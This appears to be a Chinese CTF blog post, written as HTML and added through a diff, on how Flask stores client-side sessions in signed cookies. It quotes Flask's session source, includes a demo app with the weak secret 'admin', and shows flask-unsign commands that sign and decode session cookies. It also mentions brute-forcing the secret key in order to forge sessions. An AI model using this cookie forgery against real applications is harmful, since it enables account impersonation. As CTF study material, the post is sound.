@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html class="has-navbar-fixed-top">
+<head>
+    <meta charset="utf-8">
+<title>flask中session的那些事 - Hexo</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.css">
+
+
+
+
+<meta name="description" content="">
+
+
+
+
+
+    <meta name="description" content="&amp;#x6954;&amp;#x5B50;&amp;#x5728;&amp;#x5199;HCTF2018-admin&amp;#x9898;&amp;#x76EE;&amp;#x7684;&amp;#x65F6;&amp;#x5019;&amp;#xFF0C;&amp;#x9047;&amp;#x5230;&amp;#x4E86;flask&amp;#x4E2D;session&amp;#x4F2A;&amp;#x9020;&amp;#x7684;&amp;#x95EE;&amp;#x9898;&amp;#xFF0C;&amp;#x6253;&amp;#x7B9">
+<meta property="og:type" content="article">
+<meta property="og:title" content="flask中session的那些事">
+<meta property="og:url" content="http://example.com/2019/11/19/flask%E4%B8%ADsession%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="&amp;#x6954;&amp;#x5B50;&amp;#x5728;&amp;#x5199;HCTF2018-admin&amp;#x9898;&amp;#x76EE;&amp;#x7684;&amp;#x65F6;&amp;#x5019;&amp;#xFF0C;&amp;#x9047;&amp;#x5230;&amp;#x4E86;flask&amp;#x4E2D;session&amp;#x4F2A;&amp;#x9020;&amp;#x7684;&amp;#x95EE;&amp;#x9898;&amp;#xFF0C;&amp;#x6253;&amp;#x7B9">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2019/11/19/flask%E4%B8%ADsession%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/1.png">
+<meta property="og:image" content="http://example.com/2019/11/19/flask%E4%B8%ADsession%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/2.png">
+<meta property="og:image" content="http://example.com/2019/11/19/flask%E4%B8%ADsession%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/4.png">
+<meta property="article:published_time" content="2019-11-19T06:27:51.000Z">
+<meta property="article:modified_time" content="2020-11-24T04:50:08.850Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2019/11/19/flask%E4%B8%ADsession%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/1.png">
+
+
+
+
+
+<link rel="icon" href="/favicon.png">
+
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/bulma/0.6.2/css/bulma.min.css">
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/css/justifiedGallery.min.css">
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+<script defer src="//use.fontawesome.com/releases/v5.0.8/js/all.js"></script>
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+    
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/">
+                
+                <img src="/images/logo.png" alt="" height="28">
+                
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item "
+               href="/archives">Archives</a>
+            
+            <a class="navbar-item "
+               href="/friends">Friends</a>
+            
+            <a class="navbar-item "
+               href="/about">About</a>
+            
+            <a class="navbar-item "
+               href="/tags">Tags</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            <a class="navbar-item search" title="Search" href="javascript:;">
+                <i class="fas fa-search"></i>
+            </a>
+            
+            
+            
+            <a class="navbar-item" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+               
+            
+        </div>
+    </div>
+</nav>
+
+    <section class="section">
+    <div class="container">
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            flask中session的那些事
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            
+                <time datetime="2019-11-19T06:27:51.000Z" itemprop="datePublished">19 Nov 2019</time>
+            
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/categories/CTF/">CTF</a><span>></span><a class="article-category-link" href="/categories/CTF/Web/">Web</a>
+        </span>
+        
+        
+        <span class="column is-narrow">
+            
+            
+            14 minutes read (About 2041 words)
+        </span>
+        
+    </div>
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <html><head></head><body><h3 id="&#x6954;&#x5B50;"><a href="#&#x6954;&#x5B50;" class="headerlink" title="&#x6954;&#x5B50;"></a>&#x6954;&#x5B50;</h3><p>&#x5728;&#x5199;HCTF2018-admin&#x9898;&#x76EE;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x9047;&#x5230;&#x4E86;flask&#x4E2D;session&#x4F2A;&#x9020;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x6253;&#x7B97;&#x7814;&#x7A76;&#x4E00;&#x4E0B;</p>
+<a id="more"></a>
+
+
+<h3 id="&#x4E00;&#x3001;cookie&#x548C;session&#x7684;&#x4E00;&#x4E9B;&#x5C0F;&#x59FF;&#x52BF;"><a href="#&#x4E00;&#x3001;cookie&#x548C;session&#x7684;&#x4E00;&#x4E9B;&#x5C0F;&#x59FF;&#x52BF;" class="headerlink" title="&#x4E00;&#x3001;cookie&#x548C;session&#x7684;&#x4E00;&#x4E9B;&#x5C0F;&#x59FF;&#x52BF;"></a>&#x4E00;&#x3001;cookie&#x548C;session&#x7684;&#x4E00;&#x4E9B;&#x5C0F;&#x59FF;&#x52BF;</h3><h5 id="1&#x3001;cookie&#xFF1A;"><a href="#1&#x3001;cookie&#xFF1A;" class="headerlink" title="1&#x3001;cookie&#xFF1A;"></a>1&#x3001;cookie&#xFF1A;</h5><p>&#x5728;&#x7F51;&#x7AD9;&#x4E2D;&#xFF0C;http&#x8BF7;&#x6C42;&#x662F;&#x65E0;&#x72B6;&#x6001;&#x7684;&#x3002;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x5373;&#x4F7F;&#x7B2C;&#x4E00;&#x6B21;&#x548C;&#x670D;&#x52A1;&#x5668;&#x8FDE;&#x63A5;&#x540E;&#x5E76;&#x4E14;&#x767B;&#x5F55;&#x6210;&#x529F;&#x540E;&#xFF0C;&#x7B2C;&#x4E8C;&#x6B21;&#x8BF7;&#x6C42;&#x670D;&#x52A1;&#x5668;&#x4F9D;&#x7136;&#x4E0D;&#x80FD;&#x77E5;&#x9053;&#x5F53;&#x524D;&#x8BF7;&#x6C42;&#x662F;&#x54EA;&#x4E2A;&#x7528;&#x6237;&#x3002;cookie&#x7684;&#x51FA;&#x73B0;&#x5C31;&#x662F;&#x4E3A;&#x4E86;&#x89E3;&#x51B3;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x7B2C;&#x4E00;&#x6B21;&#x767B;&#x5F55;&#x540E;&#x670D;&#x52A1;&#x5668;&#x8FD4;&#x56DE;&#x4E00;&#x4E9B;&#x6570;&#x636E;&#xFF08;cookie&#xFF09;&#x7ED9;&#x6D4F;&#x89C8;&#x5668;&#xFF0C;&#x7136;&#x540E;&#x6D4F;&#x89C8;&#x5668;&#x4FDD;&#x5B58;&#x5728;&#x672C;&#x5730;&#xFF0C;&#x5F53;&#x8BE5;&#x7528;&#x6237;&#x53D1;&#x9001;&#x7B2C;&#x4E8C;&#x6B21;&#x8BF7;&#x6C42;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5C31;&#x4F1A;&#x81EA;&#x52A8;&#x7684;&#x628A;&#x4E0A;&#x6B21;&#x8BF7;&#x6C42;&#x5B58;&#x50A8;&#x7684;cookie&#x6570;&#x636E;&#x81EA;&#x52A8;&#x7684;&#x643A;&#x5E26;&#x7ED9;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x901A;&#x8FC7;&#x6D4F;&#x89C8;&#x5668;&#x643A;&#x5E26;&#x7684;&#x6570;&#x636E;&#x5C31;&#x80FD;&#x5224;&#x65AD;&#x5F53;&#x524D;&#x7528;&#x6237;&#x662F;&#x54EA;&#x4E2A;&#x4E86;&#x3002;cookie&#x5B58;&#x50A8;&#x7684;&#x6570;&#x636E;&#x91CF;&#x6709;&#x9650;&#xFF0C;&#x4E0D;&#x540C;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x6709;&#x4E0D;&#x540C;&#x7684;&#x5B58;&#x50A8;&#x5927;&#x5C0F;&#xFF0C;&#x4F46;&#x4E00;&#x822C;&#x4E0D;&#x8D85;&#x8FC7;4KB&#x3002;&#x56E0;&#x6B64;&#x4F7F;&#x7528;cookie&#x53EA;&#x80FD;&#x5B58;&#x50A8;&#x4E00;&#x4E9B;&#x5C0F;&#x91CF;&#x7684;&#x6570;&#x636E;&#x3002;</p>
+<h5 id="2&#x3001;session"><a href="#2&#x3001;session" class="headerlink" title="2&#x3001;session:"></a>2&#x3001;session:</h5><p>session&#x548C;cookie&#x7684;&#x4F5C;&#x7528;&#x6709;&#x70B9;&#x7C7B;&#x4F3C;&#xFF0C;&#x90FD;&#x662F;&#x4E3A;&#x4E86;&#x5B58;&#x50A8;&#x7528;&#x6237;&#x76F8;&#x5173;&#x7684;&#x4FE1;&#x606F;&#x3002;&#x4E0D;&#x540C;&#x7684;&#x662F;&#xFF0C;cookie&#x662F;&#x5B58;&#x50A8;&#x5728;&#x672C;&#x5730;&#x6D4F;&#x89C8;&#x5668;&#xFF0C;&#x800C;session&#x5B58;&#x50A8;&#x5728;&#x670D;&#x52A1;&#x5668;&#x3002;&#x5B58;&#x50A8;&#x5728;&#x670D;&#x52A1;&#x5668;&#x7684;&#x6570;&#x636E;&#x4F1A;&#x66F4;&#x52A0;&#x7684;&#x5B89;&#x5168;&#xFF0C;&#x4E0D;&#x5BB9;&#x6613;&#x88AB;&#x7A83;&#x53D6;&#x3002;&#x4F46;&#x5B58;&#x50A8;&#x5728;&#x670D;&#x52A1;&#x5668;&#x4E5F;&#x6709;&#x4E00;&#x5B9A;&#x7684;&#x5F0A;&#x7AEF;&#xFF0C;&#x5C31;&#x662F;&#x4F1A;&#x5360;&#x7528;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8D44;&#x6E90;&#xFF0C;&#x4F46;&#x73B0;&#x5728;&#x670D;&#x52A1;&#x5668;&#x5DF2;&#x7ECF;&#x53D1;&#x5C55;&#x81F3;&#x4ECA;&#xFF0C;&#x4E00;&#x4E9B;session&#x4FE1;&#x606F;&#x8FD8;&#x662F;&#x7EF0;&#x7EF0;&#x6709;&#x4F59;&#x7684;&#x3002;</p>
+<h5 id="3&#x3001;cookie&#x548C;session&#x7ED3;&#x5408;&#x4F7F;&#x7528;&#xFF1A;&#xFF08;&#x5176;&#x5B9E;&#x4E2A;&#x4EBA;&#x611F;&#x89C9;&#x5C31;&#x662F;&#x5355;&#x7EAF;&#x7528;&#x4E86;cookie&#x7684;&#x529F;&#x80FD;&#xFF09;"><a href="#3&#x3001;cookie&#x548C;session&#x7ED3;&#x5408;&#x4F7F;&#x7528;&#xFF1A;&#xFF08;&#x5176;&#x5B9E;&#x4E2A;&#x4EBA;&#x611F;&#x89C9;&#x5C31;&#x662F;&#x5355;&#x7EAF;&#x7528;&#x4E86;cookie&#x7684;&#x529F;&#x80FD;&#xFF09;" class="headerlink" title="3&#x3001;cookie&#x548C;session&#x7ED3;&#x5408;&#x4F7F;&#x7528;&#xFF1A;&#xFF08;&#x5176;&#x5B9E;&#x4E2A;&#x4EBA;&#x611F;&#x89C9;&#x5C31;&#x662F;&#x5355;&#x7EAF;&#x7528;&#x4E86;cookie&#x7684;&#x529F;&#x80FD;&#xFF09;"></a>3&#x3001;cookie&#x548C;session&#x7ED3;&#x5408;&#x4F7F;&#x7528;&#xFF1A;&#xFF08;&#x5176;&#x5B9E;&#x4E2A;&#x4EBA;&#x611F;&#x89C9;&#x5C31;&#x662F;&#x5355;&#x7EAF;&#x7528;&#x4E86;cookie&#x7684;&#x529F;&#x80FD;&#xFF09;</h5><p>web&#x5F00;&#x53D1;&#x53D1;&#x5C55;&#x81F3;&#x4ECA;&#xFF0C;cookie&#x548C;session&#x7684;&#x4F7F;&#x7528;&#x5DF2;&#x7ECF;&#x51FA;&#x73B0;&#x4E86;&#x4E00;&#x4E9B;&#x975E;&#x5E38;&#x6210;&#x719F;&#x7684;&#x65B9;&#x6848;&#x3002;&#x5728;&#x5982;&#x4ECA;&#x7684;&#x5E02;&#x573A;&#x6216;&#x8005;&#x4F01;&#x4E1A;&#x91CC;&#xFF0C;&#x4E00;&#x822C;&#x6709;&#x4E24;&#x79CD;&#x5B58;&#x50A8;&#x65B9;&#x5F0F;&#xFF1A;</p>
+<p>1&#x3001;&#x5B58;&#x50A8;&#x5728;&#x670D;&#x52A1;&#x7AEF;&#xFF1A;&#x901A;&#x8FC7;cookie&#x5B58;&#x50A8;&#x4E00;&#x4E2A;session_id&#xFF0C;&#x7136;&#x540E;&#x5177;&#x4F53;&#x7684;&#x6570;&#x636E;&#x5219;&#x662F;&#x4FDD;&#x5B58;&#x5728;session&#x4E2D;&#x3002;&#x5982;&#x679C;&#x7528;&#x6237;&#x5DF2;&#x7ECF;&#x767B;&#x5F55;&#xFF0C;&#x5219;&#x670D;&#x52A1;&#x5668;&#x4F1A;&#x5728;cookie&#x4E2D;&#x4FDD;&#x5B58;&#x4E00;&#x4E2A;session_id&#xFF0C;&#x4E0B;&#x6B21;&#x518D;&#x6B21;&#x8BF7;&#x6C42;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x628A;&#x8BE5;session_id&#x643A;&#x5E26;&#x4E0A;&#x6765;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x6839;&#x636E;session_id&#x5728;session&#x5E93;&#x4E2D;&#x83B7;&#x53D6;&#x7528;&#x6237;&#x7684;session&#x6570;&#x636E;&#x3002;&#x5C31;&#x80FD;&#x77E5;&#x9053;&#x8BE5;&#x7528;&#x6237;&#x5230;&#x5E95;&#x662F;&#x8C01;&#xFF0C;&#x4EE5;&#x53CA;&#x4E4B;&#x524D;&#x4FDD;&#x5B58;&#x7684;&#x4E00;&#x4E9B;&#x72B6;&#x6001;&#x4FE1;&#x606F;&#x3002;&#x8FD9;&#x79CD;&#x4E13;&#x4E1A;&#x672F;&#x8BED;&#x53EB;&#x505A;server side session&#x3002;</p>
+<p>2&#x3001;&#x5C06;session&#x6570;&#x636E;&#x52A0;&#x5BC6;&#xFF0C;&#x7136;&#x540E;&#x5B58;&#x50A8;&#x5728;cookie&#x4E2D;&#x3002;&#x8FD9;&#x79CD;&#x4E13;&#x4E1A;&#x672F;&#x8BED;&#x53EB;&#x505A;client side session&#x3002;flask&#x91C7;&#x7528;&#x7684;&#x5C31;&#x662F;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#xFF0C;&#x4F46;&#x662F;&#x4E5F;&#x53EF;&#x4EE5;&#x66FF;&#x6362;&#x6210;&#x5176;&#x4ED6;&#x5F62;&#x5F0F;&#x3002;</p>
+<h3 id="&#x4E8C;&#x3001;&#x6E90;&#x7801;&#x5206;&#x6790;&#x4E00;&#x4E0B;"><a href="#&#x4E8C;&#x3001;&#x6E90;&#x7801;&#x5206;&#x6790;&#x4E00;&#x4E0B;" class="headerlink" title="&#x4E8C;&#x3001;&#x6E90;&#x7801;&#x5206;&#x6790;&#x4E00;&#x4E0B;"></a>&#x4E8C;&#x3001;&#x6E90;&#x7801;&#x5206;&#x6790;&#x4E00;&#x4E0B;</h3><p>&#x4ED6;&#x7684;session&#x5B58;&#x50A8;&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x7684;cookie&#x5B57;&#x6BB5;&#x4E2D;&#xFF0C;&#x4E3A;&#x4E86;&#x9632;&#x6B62;session&#x7BE1;&#x6539;&#xFF0C;flask&#x8FDB;&#x884C;&#x4E86;&#x5982;&#x4E0B;&#x7684;&#x5904;&#x7406;&#xFF0C;&#x4EE3;&#x7801;&#x5B58;&#x653E;&#x5728;flask&#x6A21;&#x5757;&#x4E2D;<code>python3\Lib\site-packages\flask\sessions.py</code>&#x6587;&#x4EF6;&#x4E2D;&#x3002;</p>
+<figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SecureCookieSessionInterface</span>(<span class="hljs-params">SessionInterface</span>):</span></span><br><span class="line">    <span class="hljs-string">&quot;&quot;&quot;The default session interface that stores sessions in signed cookies</span></span><br><span class="line"><span class="hljs-string">    through the :mod:`itsdangerous` module.</span></span><br><span class="line"><span class="hljs-string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">#: the salt that should be applied on top of the secret key for the</span></span><br><span class="line">    <span class="hljs-comment">#: signing of cookie based sessions.</span></span><br><span class="line">    salt = <span class="hljs-string">&quot;cookie-session&quot;</span></span><br><span class="line">    <span class="hljs-comment">#: the hash function to use for the signature.  The default is sha1</span></span><br><span class="line">    digest_method = <span class="hljs-built_in">staticmethod</span>(hashlib.sha1)</span><br><span class="line">    <span class="hljs-comment">#: the name of the itsdangerous supported key derivation.  The default</span></span><br><span class="line">    <span class="hljs-comment">#: is hmac.</span></span><br><span class="line">    key_derivation = <span class="hljs-string">&quot;hmac&quot;</span></span><br><span class="line">    <span class="hljs-comment">#: A python serializer for the payload.  The default is a compact</span></span><br><span class="line">    <span class="hljs-comment">#: JSON derived serializer with support for some extra Python types</span></span><br><span class="line">    <span class="hljs-comment">#: such as datetime objects or tuples.</span></span><br><span class="line">    serializer = session_json_serializer</span><br><span class="line">    session_class = SecureCookieSession</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_signing_serializer</span>(<span class="hljs-params">self, app</span>):</span></span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> app.secret_key:</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span></span><br><span class="line">        signer_kwargs = <span class="hljs-built_in">dict</span>(</span><br><span class="line">            key_derivation=self.key_derivation, digest_method=self.digest_method</span><br><span class="line">        )</span><br><span class="line">        <span class="hljs-keyword">return</span> URLSafeTimedSerializer(</span><br><span class="line">            app.secret_key,</span><br><span class="line">            salt=self.salt,</span><br><span class="line">            serializer=self.serializer,</span><br><span class="line">            signer_kwargs=signer_kwargs,</span><br><span class="line">        )</span><br></pre></td></tr></tbody></table></figure>
+
+<p>&#x6700;&#x540E;&#x751F;&#x6210;&#x7684;session&#x957F;&#x8FD9;&#x6837;<br><code>json-&gt;zlib-&gt;base64&#x540E;&#x7684;&#x6E90;&#x5B57;&#x7B26;&#x4E32; . &#x65F6;&#x95F4;&#x6233; . hmac&#x7B7E;&#x540D;&#x4FE1;&#x606F;</code><br>&#x6BD4;&#x5982;&#x6211;&#x751F;&#x6210;&#x8FD9;&#x6837;&#x7684;<code>eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6InN0NGNrIn0.Xbn4pw.6KQvoMiQZo1Ttjr4dFJ7e0AN45U</code><br>&#x8FD9;&#x662F;&#x7531;<code>{&apos;_permanent&apos;: True, &apos;username&apos;: &apos;st4ck&apos;}</code>&#xFF0C;&#x5BC6;&#x94A5;&#x4E3A;<code>admin</code>&#x751F;&#x6210;&#x7684;</p>
+<h3 id="&#x4E09;&#x3001;flask&#x7684;session&#x5B9E;&#x6218;"><a href="#&#x4E09;&#x3001;flask&#x7684;session&#x5B9E;&#x6218;" class="headerlink" title="&#x4E09;&#x3001;flask&#x7684;session&#x5B9E;&#x6218;"></a>&#x4E09;&#x3001;flask&#x7684;session&#x5B9E;&#x6218;</h3><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,session</span><br><span class="line"><span class="hljs-keyword">import</span> os</span><br><span class="line"><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> timedelta</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="hljs-string">&apos;SECRET_KEY&apos;</span>]=<span class="hljs-string">&apos;admin&apos;</span>   <span class="hljs-comment">#&#x8BBE;&#x7F6E;&#x4E3A;24&#x4F4D;&#x7684;&#x5B57;&#x7B26;,&#x6BCF;&#x6B21;&#x8FD0;&#x884C;&#x670D;&#x52A1;&#x5668;&#x90FD;&#x662F;&#x4E0D;&#x540C;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x670D;&#x52A1;&#x5668;&#x542F;&#x52A8;&#x4E00;&#x6B21;&#x4E0A;&#x6B21;&#x7684;session&#x5C31;&#x6E05;&#x9664;&#x3002;</span></span><br><span class="line">app.config[<span class="hljs-string">&apos;PERMANENT_SESSION_LIFETIME&apos;</span>]=timedelta(days=<span class="hljs-number">7</span>) <span class="hljs-comment">#&#x8BBE;&#x7F6E;session&#x7684;&#x4FDD;&#x5B58;&#x65F6;&#x95F4;&#x3002;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&apos;/&apos;</span></span>)</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hello_world</span>():</span></span><br><span class="line">    session.permanent=<span class="hljs-literal">True</span>  <span class="hljs-comment">#&#x9ED8;&#x8BA4;session&#x7684;&#x65F6;&#x95F4;&#x6301;&#x7EED;31&#x5929;</span></span><br><span class="line">    session[<span class="hljs-string">&apos;username&apos;</span>] = <span class="hljs-string">&apos;st4ck&apos;</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-string">&apos;Hello World!&apos;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">#&#x83B7;&#x53D6;session</span></span><br><span class="line"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&apos;/get/&apos;</span></span>)</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>():</span></span><br><span class="line">    <span class="hljs-keyword">return</span>  session.get(<span class="hljs-string">&apos;username&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">#&#x5220;&#x9664;session</span></span><br><span class="line"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&apos;/delete/&apos;</span></span>)</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>():</span></span><br><span class="line">    print(session.get(<span class="hljs-string">&apos;username&apos;</span>))</span><br><span class="line">    session.pop(<span class="hljs-string">&apos;username&apos;</span>)</span><br><span class="line">    print(session.get(<span class="hljs-string">&apos;username&apos;</span>))</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-string">&apos;delete&apos;</span></span><br><span class="line"><span class="hljs-comment">#&#x6E05;&#x695A;session</span></span><br><span class="line"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&apos;/clear/&apos;</span></span>)</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">clear</span>():</span></span><br><span class="line">    print(session.get(<span class="hljs-string">&apos;username&apos;</span>))</span><br><span class="line">    session.clear()</span><br><span class="line">    print(session.get(<span class="hljs-string">&apos;username&apos;</span>))</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-string">&apos;clear&apos;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:</span><br><span class="line">    app.run(debug=<span class="hljs-literal">True</span>)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>&#x6211;&#x4EEC;&#x8FD0;&#x884C;/,&#x7136;&#x540E;get&#x8BF7;&#x6C42;&#x540E;&#x83B7;&#x5F97;</p>
+<p><img src="1.png" alt="img"></p>
+<p>&#x83B7;&#x5F97;session&#x4E3A;</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6InN0NGNrIn0.Xbn3eg.zBDV4huj8XGiRbFjSPMZq1HeV5Y</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h3 id="&#x56DB;&#x3001;session&#x5B89;&#x5168;&#x95EE;&#x9898;"><a href="#&#x56DB;&#x3001;session&#x5B89;&#x5168;&#x95EE;&#x9898;" class="headerlink" title="&#x56DB;&#x3001;session&#x5B89;&#x5168;&#x95EE;&#x9898;"></a>&#x56DB;&#x3001;session&#x5B89;&#x5168;&#x95EE;&#x9898;</h3><p>&#x5176;&#x5B9E;&#x751F;&#x6210;&#x4E0A;&#x9762;&#x7684;session&#x5C45;&#x7136;&#x662F;&#x53EF;&#x4EE5;&#x7834;&#x89E3;&#x7684;&#xFF01;&#xFF01;&#xFF01;&#x4F46;&#x662F;&#x6CA1;&#x6709;SECRET_KEY&#x6211;&#x4EEC;&#x65E0;&#x6CD5;&#x4F2A;&#x9020;&#xFF0C;&#x53EF;&#x4EE5;&#x9009;&#x62E9;&#x7206;&#x7834;&#x4F46;&#x662F;&#x4E00;&#x5B9A;&#x8981;&#x62FF;&#x5230;SECRET_KEY&#x624D;&#x80FD;&#x4F2A;&#x9020;</p>
+<h4 id="&#x65B9;&#x6CD5;1&#xFF1A;&#x4F7F;&#x7528;flask-unsign&#x5DE5;&#x5177;"><a href="#&#x65B9;&#x6CD5;1&#xFF1A;&#x4F7F;&#x7528;flask-unsign&#x5DE5;&#x5177;" class="headerlink" title="&#x65B9;&#x6CD5;1&#xFF1A;&#x4F7F;&#x7528;flask-unsign&#x5DE5;&#x5177;"></a>&#x65B9;&#x6CD5;1&#xFF1A;&#x4F7F;&#x7528;<a target="_blank" rel="noopener" href="https://github.com/Paradoxis/Flask-Unsign">flask-unsign</a>&#x5DE5;&#x5177;</h4><p>&#x5B89;&#x88C5;<br><code>$ pip3 install flask-unsign</code><br>&#x547D;&#x4EE4;&#x884C;&#x5C31;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4F7F;&#x7528;<code>$ flask-unsign</code></p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\38138\Desktop&gt;flask-unsign --sign --cookie &quot;{&apos;_permanent&apos;: True, &apos;username&apos;: &apos;st4ck&apos;}&quot; --secret &quot;secret&quot;</span><br><span class="line">eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6InN0NGNrIn0.Xbn-9Q.uNm3a4894t-TZogqY-Ab4M0HDz4</span><br><span class="line"></span><br><span class="line">C:\Users\38138\Desktop&gt;flask-unsign --decode --cookie &quot;eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6InN0NGNrIn0.Xbn-9Q.uNm3a4894t-TZogqY-Ab4M0HDz4&quot;</span><br><span class="line">{&apos;_permanent&apos;: True, &apos;username&apos;: &apos;st4ck&apos;}</span><br></pre></td></tr></tbody></table></figure>
